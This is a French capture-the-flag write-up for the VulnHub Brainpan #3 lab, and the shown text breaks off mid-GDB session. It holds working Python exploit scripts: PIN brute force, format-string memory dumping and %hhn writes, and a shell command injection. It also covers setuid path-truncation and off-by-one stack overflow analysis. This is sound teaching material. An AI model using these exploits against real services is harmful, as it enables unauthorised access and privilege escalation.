# Solution du CTF Brainpan #3 de VulnHub

Introduction dramatique
-----------------------

Après avoir terminé le CTF *Fortress* de [HackTheBox](https://www.hackthebox.eu/) qui mêlait différentes exploitations de binaires (dont une sur le tas), j'ai décidé de pousser l'auto-flagellation en finissant le [Brainpan #3](https://www.vulnhub.com/entry/brainpan-3,121/) entamé il y a déjà quelques temps de cela.  

Cette série de CTF créée par [superkojiman](https://twitter.com/@superkojiman) est sans doute parmi les CTFs les plus difficiles proposés sur *VulnHub*.

L'occasion de retrouver les noms d'utilisateurs *anansi*, *puck* et *reynard* déjà croisés pour [Brainpan #1](http://devloop.users.sourceforge.net/index.php?article105/solution-du-ctf-brainpan-1) et [Brainpan #2](http://devloop.users.sourceforge.net/index.php?article73/solution-du-ctf-brainpan2).

Au menu : exploitation de chaîne de format (voir [mon tuto](http://devloop.users.sourceforge.net/index.php?article102/pwing-echo-exploitation-d-une-faille-de-chaine-de-format) comme pré-requis), ROP, race-condition et autres joyeusetés.  

Houlala 2: la mission
---------------------

Comme avec les autres challenges de la série on se retrouve vite fait en face d'un service fait maison :  

```plain
Not shown: 65533 filtered ports
PORT     STATE  SERVICE
1337/tcp open   waste
8080/tcp closed http-proxy
```

Quand on s'y connecte on a une mire de connexion qui nécessite un code à quatre chiffres :  

```plain
$ ncat 192.168.3.2 1337 -v
Ncat: Version 7.01 ( https://nmap.org/ncat )
Ncat: Connected to 192.168.3.2:1337.

  __ )    _ \      \    _ _|   \  |   _ \    \      \  |     _ _| _ _| _ _|
  __ \   |   |    _ \     |     \ |  |   |  _ \      \ |       |    |    |
  |   |  __ <    ___ \    |   |\  |  ___/  ___ \   |\  |       |    |    |
 ____/  _| \_\ _/    _\ ___| _| \_| _|   _/    _\ _| \_|     ___| ___| ___|

                                                            by superkojiman

AUTHORIZED PERSONNEL ONLY
PLEASE ENTER THE 4-DIGIT CODE SHOWN ON YOUR ACCESS TOKEN
A NEW CODE WILL BE GENERATED AFTER THREE INCORRECT ATTEMPTS

ACCESS CODE: 1254
FAILED LOGIN ATTEMPTS: 1

AUTHORIZED PERSONNEL ONLY
PLEASE ENTER THE 4-DIGIT CODE SHOWN ON YOUR ACCESS TOKEN
A NEW CODE WILL BE GENERATED AFTER THREE INCORRECT ATTEMPTS

ACCESS CODE: 8754
FAILED LOGIN ATTEMPTS: 2

AUTHORIZED PERSONNEL ONLY
PLEASE ENTER THE 4-DIGIT CODE SHOWN ON YOUR ACCESS TOKEN
A NEW CODE WILL BE GENERATED AFTER THREE INCORRECT ATTEMPTS

ACCESS CODE: 5632
FAILED LOGIN ATTEMPTS: 3

BRUTE-FORCE ATTEMPT DETECTED
PLEASE USE THE NEW CODE DISPLAYED ON YOUR ACCESS TOKEN

AUTHORIZED PERSONNEL ONLY
PLEASE ENTER THE 4-DIGIT CODE SHOWN ON YOUR ACCESS TOKEN
A NEW CODE WILL BE GENERATED AFTER THREE INCORRECT ATTEMPTS

ACCESS CODE:
```

On remarque qu'au bout de trois tentatives le code que l'on cherche est réinitialisé. De plus une temporisation est faite après ces 3 tentatives.  

Une solution pour bypasser cette protection anti brute force est de re-établir une connexion après deux tentatives pour que le code ne soit pas réinitialisé. On peut aussi brute-forcer bêtement et compter sur la chance (sur un malentendu...). Ces deux possibilités fonctionnent mais prennent beaucoup de temps.  

On serait tenté d'aller plus loin en parallélisant l'attaque avec plusieurs process (parce que Python et les threads...) ce qui à titre d'exemple donnerait ceci :  

```python
import socket
from time import sleep
from math import ceil
from multiprocessing import Process, Queue, Pool

NB_PROCESS = 4

def split(a, n):
    k, m = divmod(len(a), n)
    return (a[i * k + min(i, m):(i + 1) * k + min(i + 1, m)] for i in range(n))

ranges = list(split(range(10000), NB_PROCESS))
print("Ranges:", ranges)

def wait_until(sock, patterns: tuple):
    buff = b""
    while True:
        buff += sock.recv(1024)
        for message in patterns:
            if message.encode() in buff:
                return message

def brute(number_range):
    sock = socket.socket()
    sock.connect(("192.168.3.2", 1337))
    successive_attempts = 0

    for i in number_range:

        if successive_attempts == 2:
            sock.close()
            sleep(.01)
            successive_attempts = 0
            sock = socket.socket()
            for j in range(50):
                try:
                    sock.connect(("192.168.3.2", 1337))
                except ConnectionRefusedError:
                    sleep(5)
                    continue
                else:
                    break

        code = "{:04}".format(i)
        msg = wait_until(sock, ("\nACCESS CODE:", "SESSION"))
        if msg == "\nACCESS CODE:":
            sock.send(code.encode() + b"\n")
            successive_attempts += 1
        else:
            print("Found code", str(code-1))
            return code-1

    sock.close()
    print("I'm done with", i)
    return -1

with Pool(NB_PROCESS) as pool:
    print(pool.map(brute, ranges))
```

Seulement le service semble mal digérer ces connexions parallèles et semble bloquer pour une raison inconnue. La vérité est donc ailleurs.  

On suppose alors que le binaire est vulnérable d'entrée de jeu. Dans un cas comme celui-ci une faille de chaîne de format semble la plus probable.  

```plain
ACCESS CODE: %8x
ERROR #1: INVALID ACCESS CODE: bfc3f5cc
```

Bingo ! On peut alors remonter les valeurs sur la stack. Notez que la VM est une machine Linux 32bits.  

```plain
ACCESS CODE: %2$.8X
ERROR #1: INVALID ACCESS CODE: 00000000

ACCESS CODE: %3$.8X
ERROR #1: INVALID ACCESS CODE: 00000F89

ACCESS CODE: %4$.8X
ERROR #1: INVALID ACCESS CODE: BFC3F5CC

ACCESS CODE: %5$.8X
ERROR #1: INVALID ACCESS CODE: 00000000

ACCESS CODE: %6$.8X
ERROR #1: INVALID ACCESS CODE: 0000000A

ACCESS CODE: %7$.8X
ERROR #1: INVALID ACCESS CODE: 65527800
```

Et ainsi de suite. Qu'est-on susceptible de trouver sur la stack ? Paramètres de fonctions (on est en 32 bits), adresses mémoires pour des variables sur la stack, adresses pointant vers du code (addresses de retour), etc.  

Le plus intéressant pour le moment est le troisième argument 0xF89 qui correspond à 3977 en décimal et qui s'avère être le précieux sésame pour passer la mire :  

```plain
ACCESS CODE: 3977

--------------------------------------------------------------
SESSION: ID-1415
  AUTH   [Y]    REPORT [N]    MENU   [Y]  
--------------------------------------------------------------

1  - CREATE REPORT
2  - VIEW CODE REPOSITORY
3  - UPDATE SESSION NAME
4  - SHELL
5  - LOG OFF

ENTER COMMAND:
```

On obtient des retours différents selon le numéro de commande saisi :  

```plain
ENTER COMMAND: 1
SELECTED: 1
REPORT MODE IS DISABLED IN THIS BUILD

ENTER COMMAND: 2
SELECTED: 2

CODE REPOSITORY IS NOW AVAILABLE

ENTER COMMAND: 3
SELECTED: 3
ENTER NEW SESSION NAME: yolo
--------------------------------------------------------------
SESSION: yolo
3
  AUTH   [Y]    REPORT [N]    MENU   [Y]
--------------------------------------------------------------

ENTER COMMAND: 4
SELECTED: 4
reynard@brainpan3 $ id
uid=1000(reynard) gid=1000(reynard)
reynard@brainpan3 $ ls
total 0
-rw-rw-r-- 1 reynard reynard 22 May 10 22:26 .flag
-rw-rw-r-- 1 reynard reynard  0 May 10 22:26 never
-rw-rw-r-- 1 reynard reynard  0 May 10 22:26 gonna
-rw-rw-r-- 1 reynard reynard  0 May 10 22:26 give
-rw-rw-r-- 1 reynard reynard  0 May 10 22:26 you
-rw-rw-r-- 1 reynard reynard  0 May 10 22:26 up
-rw-rw-r-- 1 reynard reynard  0 May 10 22:26 never
-rw-rw-r-- 1 reynard reynard  0 May 10 22:26 gonna
-rw-rw-r-- 1 reynard reynard  0 May 10 22:26 let
-rw-rw-r-- 1 reynard reynard  0 May 10 22:26 you
-rw-rw-r-- 1 reynard reynard  0 May 10 22:26 down
reynard@brainpan3 $ uname -a
uname -a: command not found
reynard@brainpan3 $ cat .flag
(ಠ_ಠ)
reynard@brainpan3 $ whoami
reynard
reynard@brainpan3 $ quit
quit: command not found
reynard@brainpan3 $ exit
```

La commande 5 quand à elle ferme la session en cours et ramène sur la mire de saisie du PIN.  

Le shell obtenu ici est uniquement un troll qui répond à une poignée de commandes prédéfinies.  

L'option 2 rend accessible le port 8080 qui est un serveur web tournant via le module *HTTPServer* de Python (l'entête HTTP Server est reconnaissable en mille).  

Ce serveur dispose d'un *robots.txt* avec une seule entrée :  

```plain
User-agent: *
Disallow: /bp3_repo
```

On y trouve seulement une gif animée de [asshole mario](https://iwastesomuchtime.com/94218). Un dirbuster trouvera facilement le dossier /repo qui se veut plus engageant.  

![Brainpan 3 CTF http repository](https://raw.githubusercontent.com/devl00p/blog/master/images/brainpan_3/bp3_repo.png)

On a même droit à un fichier README avec un message d'encouragement :  

> Well you've made it this far. No turning back now.

L'image présente donne à rire (jaune) :  

![Brainpan 3 CTF How to pwn joke image](https://raw.githubusercontent.com/devl00p/blog/master/images/brainpan_3/bp3_how-to-pwn.jpg)

Les autres fichiers présents sont des exécutables Linux (ELF) mais en dehors de *report* tous semblent être des trolls comme le binaire shell qui ne fait qu'un *puts()* de l'ascii suivant :  

```plain
            ___
        .-"; ! ;"-.
      .'!  : | :  !`.
     /\  ! : ! : !  /\
    /\ |  ! :|: !  | /\
   (  \ \ ; :!: ; / /  )
  ( `. \ | !:|:! | / .' )
  (`. \ \ \!:|:!/ / / .')
   \ `.`.\ |!|! |/,'.' /
    `._`.\\\!!!// .'_.'
       `.`.\\|//.'.'
        |`._`n'_.'|
        "----^----"
     here's your shell
```

(jeu de mot sur shell... humour)  

Et comme la fonctionnalité de *report* est désactivé sur le service cela ne nous est pas vraiment utile pour le moment.  

Retour donc sur ce service et en particulier sur la commande 3 qui a une fois de plus une faille de chaîne de format post-authentification :  

```plain
ENTER COMMAND: 3
SELECTED: 3
ENTER NEW SESSION NAME: Hello %.8X
--------------------------------------------------------------
SESSION: Hello BFC3F47C
  AUTH   [Y]    REPORT [N]    MENU   [Y]
--------------------------------------------------------------
```

Maintenant l'étape suivante est de pouvoir dumper pas seulement en spécifiant un offset de la stack mais en passant directement une adresse.  

Il faut d'abord trouver l'offset où se trouve des données sous notre contrôle :  

```plain
ENTER COMMAND: 3
SELECTED: 3
ENTER NEW SESSION NAME: %5$08xAABBBBCCCC
--------------------------------------------------------------
SESSION: 42424242AABBBBCCCC
```

Si on remplace ici notre %x par un %s on sera en mesure de faire afficher ce qui se trouver à l'adresse 0x42424242.  

On peut commencer par examiner les adresses mémoires de la stack. Il faut mettre de côté les valeurs trop faibles qui ne correspondent vraisemblablement à une adresse valide.  

Petit rappel sur la structure d'un binaire 32bits en mémoire : les adresses correspondant à la stack seront plus grandes que celles correspondant au code.  

![Linux x86 process memory layout](https://raw.githubusercontent.com/devl00p/blog/master/images/brainpan_3/bp3_program_in_memory.png)

```python
import socket
import struct
from string import printable
from binascii import unhexlify, hexlify
import re
from typing import Union
from time import sleep
from telnetlib import Telnet

TARGET = "192.168.3.2"

CODE_REGEX = re.compile(r"INVALID ACCESS CODE: ([0-9A-F]{8})")
SESSION_REGEX = re.compile(r"SESSION: ([0-9A-F]{8})")
MIN_ADDR = 0xB7000000

def wait_until(sock, patterns: Union[tuple, str]):
    if isinstance(patterns, str):
        patterns = (patterns, )

    buff = b""
    while True:
        buff += sock.recv(1024)
        for message in patterns:
            if message.encode() in buff:
                return message, buff

def hex_repr(int_value):
    result = "'"
    raw = struct.pack("<I", int_value)
    for b in raw:
        if chr(b) in printable[:95]:
            result += chr(b)
        else:
            result += "\\x{:02X}".format(b)
    result += "'"
    return result

sock = socket.socket()
sock.connect((TARGET, 1337))

wait_until(sock, "\nACCESS CODE:")
sock.send(b"%3$.8X\n")
pattern, buff = wait_until(sock, "\nACCESS CODE:")
search = CODE_REGEX.search(buff.decode())

if not search:
    print("Can't find code in ouput '{}' !".format(buff))

code = str(int(search.group(1), 16))
sock.send(code.encode() + b"\n")

wait_until(sock, "ENTER COMMAND:")

memory_addresses = []
for i in range(1, 10):
    session = "%{}$.8X".format(i)
    sock.send(b"3\n")
    wait_until(sock, "NEW SESSION NAME:")
    sock.send(session.encode() + b"\n")
    pattern, buff = wait_until(sock, "ENTER COMMAND:")
    search = SESSION_REGEX.search(buff.decode())

    if not search:
        print("Can't find session in ouput '{}' !".format(buff))

    value = int(search.group(1), 16)
    if value > MIN_ADDR:
        memory_addresses.append(value)
    print("{} => {} {}".format(session, "0x{:08X}".format(value), hex_repr(value)))

for addr in memory_addresses:
    session = b"%5$08sAA" + struct.pack("<I", addr) + b"CCCC"
    sock.send(b"3\n")
    wait_until(sock, "NEW SESSION NAME:")
    sock.send(session)
    pattern, buff = wait_until(sock, "ENTER COMMAND:")
    data = buff.split(b"SESSION: ")[1].split(b"CCC\n  AUTH")[0]
    print(repr(data))
```

Ce qui nous donne :  

```plain
%1$.8X => 0xBF9301BC '\xBC\x01\x93\xBF'
%2$.8X => 0x00000104 '\x04\x01\x00\x00'
%3$.8X => 0x2E243325 '%3$.'
%4$.8X => 0x00005838 '8X\x00\x00'
%5$.8X => 0xB771A858 'X\xA8q\xB7'
%6$.8X => 0xB7710C20 ' \x0Cq\xB7'
%7$.8X => 0x00001000 '\x00\x10\x00\x00'
%8$.8X => 0xB7718000 '\x00\x80q\xB7'
%9$.8X => 0xB7640513 '\x13\x05d\xB7'
b'%5$08sAA\xbc\x01\x93\xbfCCCAA\xbc\x01\x93\xbf'
b'        AAX\xa8q\xb7'
b'\x88 \xad\xfb\x05\x80q\xb7\x05\x80q\xb7AA \x0cq\xb7'
b' 5757\nX\nA\n  AUTH   [Y]    REPORT [N]    MENU   [Y]  \n--------------------------------------------------------------\n\n\n1  - CREATE REPORT\n2  - VIEW CODE REPOSITORY\n3  - UPDATE SESSION NAME\n4  - SHELL\n5  - LOG OFF\n\nENTER COMMAND: '
b'[=\x01\xf0\xff\xffs2\xc3\xe8_\xe5\x01AA\x13\x05d\xb7'
```

Ça nous conforte dans notre cheminement. Maintenant on peut prendre l'adresse la plus grosse qui correspondra probablement approximativement à la valeur actuelle d'ESP (sommet de la stack) et explorer jusqu'à la base de la stack.  

Pour ce faire on ne vas pas incrémenter stupidement les adresses d'octet en octet mais augmenter du nombre d'octets dumpés à chaque fois. Il faut aussi gérer les cas particuliers où rien n'est retourné (parce que l'adresse pointe vers NULL) et aussi le fait qu'on ne peut pas passer sereinement une adresse contenant un octet nul :  

```python
dump = b''
# max for stack
start = max(memory_addresses)
addr = start

try:
    for i in range(200):
        if addr & 0xFF == 0:
            addr += 1
            dump += b"\0"
            continue

        session = b"AAAA%6$sBBBB" + struct.pack("<I", addr) + b"DDDD"
        sock.send(b"3\n")
        wait_until(sock, "NEW SESSION NAME:")
        sock.send(session)
        pattern, buff = wait_until(sock, "ENTER COMMAND:")
        data = buff.split(b"AAAA")[1].split(b"BBBB")[0]
        print(hex(addr), repr(data))

        if len(data):
            dump += data
            addr += len(data)
        else:
            dump += b"\0"
            addr += 1

        # if b"brainpan3" in data:
        #     break
except KeyboardInterrupt:
    pass

print("Dump starts at 0x{:08x}".format(start))

with open("/tmp/stack", "wb") as fd:
    fd.write(dump)
```

Le contenu de la stack dumpée est évidemment une mine d'or. On y trouve ce qui doit être l'adresse de retour de la fonction en cours (*0x0804938b*) et en remontant à la base on obtient les *argv* et *envp* :  

```plain
0xbfb65efb b'brainpan3'
0xbfb65f05 b'UPSTART_INSTANCE='
0xbfb65f17 b'UPSTART_JOB=xinetd'
0xbfb65f2a b'TERM=linux'
0xbfb65f35 b'PATH=/usr/local/sbin:/usr/local/bin:/usr/bin:/usr/sbin:/sbin:/bin'
0xbfb65f77 b'RUNLEVEL=2'
0xbfb65f82 b'PREVLEVEL=N'
0xbfb65f8e b'UPSTART_EVENTS=runlevel'
0xbfb65fa6 b'PWD=/'
0xbfb65fac b'PIDFILE=/var/run/xinetd.pid'
0xbfb65fc8 b'REMOTE_HOST=192.168.3.254'
0xbfb65fe2 b'/usr/local/sbin/brainpan3'
```

Le nombre de variables d'environnement limité et la mention de *xinetd* laisse supposer que le binaire vulnérable est tcpwrappé. Cela signifie que le démon *xinetd* se charge de la gestion du réseau et redirige ses sockets vers le binaire */usr/local/sbin/brainpan3* qui lui ne fait que des *gets()* / *puts()* et compagnie mais aucun appel réseau.  

Le point important à en déduire c'est qu'on a pas besoin d'utiliser un shellcode du type connect-back : un simple ret-into-libc pour lancer *system('/bin/sh')* sera fonctionnel grâce aux entrées / sorties redirigées.  

En dumpant la stack on note aussi la présence de dwords correspondant aux caractères 'Y' et 'N', les même utilisés pour indiquer les fonctionnalités présentes dans le binaire :  

```plain
--- snip ---
0xbf9302b8 b'N'
0xbf9302b9 b''
0xbf9302ba b''
0xbf9302bb b''
0xbf9302bc b'Y'
--- snip ---
```

Avec le format *%hhn* on est capable d'écrire le nombre de caractères affichés à un octet dont on spécifie l'adresse. Si on écrase les valeurs 'N' par une valeur quelconque on débloque la fonctionnalité de *report*... enfin plus ou moins :  

```plain
INVALID REPORT VALUE
ERROR #3 0x5f5f5348 0x49545354 0x4f524d5f5f
```

Hmmm wtf ?  

```python
>>> from binascii import unhexlify
>>> unhexlify("5f5f5348495453544f524d5f5f")
b'__SHITSTORM__'
```

Il semble qu'on ne peut pas mettre n'importe quoi, il faut vraiment écrire des Y pour activer correctement l'entrée de menu.  

Avant d'aller plus loin j'ai choisi de dumper la totalité du code du binaire. Il suffit de définir *start* dans le code Python plus haut à *0x08048000* et de laisser tourner jusqu'à ce que le service bloque.  

On peut alors ouvrir le binaire obtenu dans [Cutter](https://github.com/radareorg/cutter). Evidemment le code obtenu est assez chaotique à cause des octets nuls.  

Le plus dérangeant étant de ne pas disposer des noms des fonctions lors des *call*, toutefois on peut voir avec un éditeur hexa la liste des noms de fonctions importées de la libc et par déduction retrouver le nom correspondant.  

Ainsi :  

* *printf* sera la fonction recevant une chaîne de format
* on sait que *read* sera par exemple appelé après un affichage de *'ACCESS CODE:'*
* on se doute que *atoi()* est utilisé pour convertir le PIN en entier, idem pour les numéros de commande
* on sait que *sleep()* sera appelé après 3 tentatives infructueuses
* *puts()* sera utilisé pour les affichages simples
* *\_stack\_chk\_fail* sera appelé en fin de fonction
* *time()* et *srand()* seront certainement utilisés l'un après l'autre pour générer le PIN aléatoire

Une poignée de fonctions restaient à retrouver. C'est le cas de quelques appels réseau. En effet la fonction qui gère l'activation du service web teste si le serveur web est lancé en tentant de s'y connecter.  

On voit aussi que *system()* est utilisé par le binaire... toujours bon à savoir.  

![Brainpan 3 CTF repo activation function](https://raw.githubusercontent.com/devl00p/blog/master/images/brainpan_3/bp3_repo_code.png)

J'ai pu retrouver la fonction que j'ai baptisé *choice()* qui lance les commandes en fonction du numéro reçu :  

![Brainpan 3 CTF choice function](https://raw.githubusercontent.com/devl00p/blog/master/images/brainpan_3/bp3_choice.png)

Si on remonte à la fonction appelante on peut voir la conversion du PIN saisi et sa vérification, des caractères Y et N passés à *choice()* et tout en bas OH l'adresse de retour vu plus tôt :-)  

Mais même si il y a bien des façons d'exploiter ce programme (ret-into-libc ou écriture d'un shellcode dans une partie de la stack non-utilisé et saut dessus) on n'aura pas besoin d'un venir jusque là car on trouve une faille d'injection de commande dans la fonction de report, pourvu qu'on l'active correctement :p   

![Brainpan 3 CTF report function](https://raw.githubusercontent.com/devl00p/blog/master/images/brainpan_3/bp3_report_func.png)

On voit ici plusieurs instructions *repne sbasb*. Cette instruction va scanner les octets dans la chaîne pointée par *EDI* jusqu'à trouver un octet matchant la valeur de *EAX* (ici ça recherche la fin de chaîne au final, rien de compliqué).  

Des double-quotes sont accolés à la commande initiale */var/www/repo/report*  et un strcat a lieu entre les deux qui accole le nom de session. On peut donc échapper le double-quote simplement en le fermant.  

Il ne reste qu'à adapter notre code Python :  

```python
nope_addresses = []
offset = 0
while True:
    try:
        offset = dump.index(b"N\0\0\0", offset)
    except ValueError:
        # No more N's
        break
    else:
        nope_addresses.append(start + offset)
        offset += 4

for nope in nope_addresses:
    # Let's replace N's with Y's
    print("N found at 0x{:08x}".format(nope))
    session = b"%89c%6$hhnBB" + struct.pack("<I", nope) + b"DDDD"
    sock.send(b"3\n")
    wait_until(sock, "NEW SESSION NAME:")
    sock.send(session)
    pattern, buff = wait_until(sock, "ENTER COMMAND:")

sock.send(b"3\n")
wait_until(sock, "NEW SESSION NAME:")
sock.send(b"YOLO\0\n")
wait_until(sock, "ENTER COMMAND:")

sock.send(b"1\n")
wait_until(sock, "END WITH NEW LINE:")
# Let's escape the double-quotes, comment the end to prevent errors
sock.send(b"d 0\"; bash #\n\n")

sleep(1)
t = Telnet()
t.sock = sock
t.interact()
sock.close()
```

L’utilisation du module *telnetlib* de Python permet de rediriger facilement notre socket client vers l'entrée/sortie de notre terminal afin de dialoguer avec le shell obtenu.  

![Brainpan 3 CTF format string exploit anansi shell](https://raw.githubusercontent.com/devl00p/blog/master/images/brainpan_3/bp3_anansi_shell.png)

Note importante: faire transiter le shell par le même port n'est pas un choix car les connexions sortantes sont bloquées par le pare feu et comme on a activé le port 8080 via la commande 2 on ne peut pas profiter de ce port. Redémarrer la VM serait une solution pour utiliser ce port mais on pourrait considérer cela comme de la triche.  

On a donc notre utilisateur *uid=1000(anansi) gid=1003(webdev) groups=1000(anansi)* sur une distribution *Ubuntu trusty 14.04.2 LTS*.  

skrewdriver
-----------

En recherchant les fichiers et dossiers sur lesquels ont dispose de droits d'écriture on trouve le dossier */home/reynard/private* qui contient les fichiers suivants :  

```plain
-rwsr-xr-x 1 reynard reynard 5568 May 19  2015 cryptor
-r-------- 1 reynard reynard   77 May 21  2015 sekret.txt.enc
```

Un secret et un binaire setuid... intéressant :)  

Le programme *cryptor* nécessite deux arguments : un nom de fichier ainsi qu'une clé.  

Il est très simple et la totalité du code réside dans une fonction à *0x080485ed* appelée par le *main()*. Cette fonction lit le fichier source caractère par caractère, effectue un XOR avec la clé passée et écrit dans un fichier correspondant au fichier original auquel le suffixe *.enc* a été ajouté.  

![Brainpan 3 CTF cryptor assembly code XOR loop](https://raw.githubusercontent.com/devl00p/blog/master/images/brainpan_3/bp3_cryptor_code.png)

Si on XOR un fichier avec la clé 0 on obtiendra un fichier identique. Dès lors on peut obtenir le contenu du secret encodé avec la commande suivante :  

```bash
/home/reynard/private/cryptor /home/reynard/private/sekret.txt.enc 0;base64 /home/reynard/private/sekret.txt.enc.enc
```

Pour obtenir le texte clair on teste juste toutes les valeurs possibles pour la clé (de 0 à 255) :  

```python
from base64 import b64decode
data = b64decode("2NiGurfyobexoLem8qa98r+zubu8tfKzvKumuru8tfKms6Gmt/K1vb228ruh8qGzvqb+8qK3oqK3oP7ys7y28qGgu6Czsbqz/PLY2Ng=")
for i in range(256):
  print("{} => {}".format(i, "".join([chr(b ^ i) for b in data])))
```

Pour une clé de 210 on obtient le message *The secret to making anything taste good is salt, pepper, and sriracha.*  

Cela fonctionne aussi avec 242 (les caractères sont alors en majuscule).  

Mais le tout nous fait une belle jambe... Il est temps de fouiller un peu sur le système.  

Le manège enchanté
------------------

En raison de la présence du firewall il est difficile d'uploader du contenu sur la VM du CTF mais on s'en tire avec les utilitaires *echo* et *base64*.  

LinEnum remonte ainsi le fichier de crontab */etc/cron.d/msg\_admin* dont voici le contenu :  

```bash
* * * * * root cd /opt/.messenger; for i in *.msg; do /usr/local/bin/msg_admin 1 $i; rm -f $i; done
```

On a donc un binaire à exploiter qui va chercher ses entrées dans des fichiers *.msg* qui doivent être mis dans */opt/.messenger*. Ce dossier a des permissions particulières :  

```plain
drwxrwx---  3 root dev  4096 Jun 10  2015 .messenger
```

Il faut être dans le compte *dev* pour y placer un fichier donc il nous faut les droits de l'un de ces accounts :  

```plain
uid=1002(reynard) gid=1002(reynard) groups=1002(reynard),1004(dev)
uid=1001(puck) gid=1001(puck) groups=1001(puck),1004(dev)
```

On sait que le binaire *cryptor* peut nous donner l'uid *reynard* mais il n'est pas setgid *dev* ! Qui plus est ici pas de serveur SSH tournant en local donc pas de récupération de shell facile :(   

Dans */etc/xinetd.d* on trouve l'entrée de ce cher programme *brainpan3* :  

```plain
service trixd
{
        disable         = no
        socket_type     = stream
        protocol        = tcp
        wait            = no
        user            = anansi
        group           = webdev
        bind            = 0.0.0.0
        server          = /usr/local/sbin/brainpan3
        type            = UNLISTED
        port            = 1337
        rlimit_stack    = 8389000
}
```

Mais aussi une entrée pour un service tournant sur le port 7075 local et tournant avec le bon GID !  

```plain
service trixd
{
        disable         = no
        socket_type     = stream
        protocol        = tcp
        wait            = no
        user            = puck
        group           = dev
        bind            = 127.0.0.1
        server          = /usr/local/sbin/trixd
        type            = UNLISTED
        port            = 7075
        rlimit_stack    = 8389000
}
```

Conclusion des courses : *brainpan3 => cryptor => trixd => msg\_admin => flag* (si tout va bien)  

Sprint... faux départ
---------------------

Que fait ce binaire *trixd* ? Une fois de plus il s'agit d'un ELF x86 de petite taille avec tout dans le *main()*.  

Première particularité ? Il effectue un *ptrace()* pour déterminer s'il est en train d'être débogué. On peut très facilement NOPer cette partie pour des tests en local depuis *Cutter*.  

Pour le reste ça se résume à ceci :  

![Brainpan 3 CTF trixd assembly](https://raw.githubusercontent.com/devl00p/blog/master/images/brainpan_3/bp3_trixd.png)

Le programme compare simplement le contenu de */mnt/usb/key.txt* avec le contenu de */home/puck/key.txt*. S'ils correspondent il nous donne gracieusement un shell, sinon un message d'échec.  

*trixd* vérifie préalablement que le fichier n'est pas un lien symbolique avec un appel à *\_\_lxstat* et bizarrement définit un *select()* avec un timeout qui doit provoquer une temporisation entre le check sur le type de fichier et la comparaison sur les contenus. On est donc en présence d'une race condition.  

Impossible d'obtenir le contenu de la clé de l'utilisateur *puck*. Quand à l'autre fichier il nécessite les droits de *reynard* :  

```plain
drwxrwx--- 2 reynard dev 4096 Jun 17  2015 /mnt/usb
```

On en revient donc au programme *cryptor* et en particulier à ce qui est fait avant le cryptage :  

![Brainpan 3 CTF cryptor assembly code](https://raw.githubusercontent.com/devl00p/blog/master/images/brainpan_3/bp3_cryptor_2.png)

Le code effectue un *strlen()* sur le nom du fichier source et effectue soit un *strncpy* soit un *strcpy* si la taille est supérieure ou non à 116.  

Le résultat de ce str(n)cpy permet de générer le nom du fichier de sortie.  

Par exemple si on dépasse ces 116 caractères alors le nom du fichier est d'abord tronqué à 90 caractères avant que le suffixe *.enc* soit ajouté. On peut en profiter pour faire en sorte que le programme écrive son output en dehors du dossier normalement attendu et par exemple obtenir le contenu du fichier */mnt/usb/key.txt* :  

```plain
anansi@brainpan3:/home/reynard/private$ ./cryptor /tmp/././././././././././././././././././././././././././././././././././././././/..//tmp/./.././tmp/../mnt/usb/key.txt 0
[+] saving to /tmp/././././././././././././././././././././././././././././././././././././././/..//tmp/.enc
anansi@brainpan3:/home/reynard/private$ cat /tmp/.enc
9H37B81HZYY8912HBU93
```

Mike Tyson
----------

J'espère que vous êtes bien installés car là ça commence à devenir costaud :'D  

```plain
$ ./cryptor `python -c "print 'A'*115"` 0
[+] saving to AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.enc
$ ./cryptor `python -c "print 'A'*117"` 0
[+] saving to AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.enc
$ ./cryptor `python -c "print 'A'*116"` 0
[+] saving to AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.enc
[1]    3225 segmentation fault (core dumped)  ./cryptor `python -c "print 'A'*116"` 0
```

Hmmm donc le programme segfault si on lui passe un nom de fichier long de 116 octets mais pas plus ni moins... comment est-ce possible ?  

En entrée de la fonction 124 octets sont réservés sur la pile. Parmi les variables locales se trouve *dest* (tel que nommé dans *Cutter*) correspondant à *ebp-0x78* soit 120 octets sur la pile juste avant les valeurs sauvegardées de EBP est ESP.  

Si le nom de fichier fait pile poil 116 octets un *strcpy* est effectué dans *dest* puis le suffixe *.enc* est ajouté ce qui nous fait 120 octets.  

Sauf que TADAM! les deux dernières lignes du code assembleur vu plus haut montrent qu'un zéro terminal est ajouté. On écrase donc l'octet de poids faible de la sauvegarde de EBP. C'est une faille de type off-by-one.  

Ça a un effet direct car à la fin du *main()* l'instruction *leave* est appelé qui correspond à *mov esp, ebp* puis *pop esp*. Le ESP en fin de *main()* récupère donc cette valeur arrondie et au lieu de pointer sur un endroit attendu sur la stack il va pointer plus bas sur les données que l'on contrôle.  

Et comme un *ret* suit toujours un *leave* on contrôle finalement l'adresse de retour.  

Un jeu de 7 erreurs avec une session GDB devrait être plus clair. Commençons par le fonctionnement attendu :  

```plain
(gdb) r `python -c "print 'A'*110"` tatayoyo
Starting program: /home/nico/VirtualBox VMs/brainpan3/cryptor `python -c "print 'A'*110"` tatayoyo

Breakpoint 1, 0x08048786 in ?? ()  <-- au moment de l'appel de la fonction principale
(gdb) info reg ebp esp
ebp            0xffffd428       0xffffd428
esp            0xffffd420       0xffffd420
(gdb) c
Continuing.
[+] saving to AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.enc

Breakpoint 2, 0x08048746 in ?? ()  <-- sur le ret de la fonction principale
(gdb) info reg ebp esp
ebp            0xffffd428       0xffffd428  <-- ebp non modifié
esp            0xffffd41c       0xffffd41c
(gdb) x/wx $esp
0xffffd41c:     0x0804878b  <-- adresse de retour sur le main
(gdb) ni
0x0804878b in ?? ()
(gdb) x/3i $eip
=> 0x804878b:   mov    $0x0,%eax
   0x8048790:   leave
   0x8048791:   ret
(gdb) ni
0x08048790 in ?? ()   <-- leave + ret du main()
(gdb) ni
0x08048791 in ?? ()
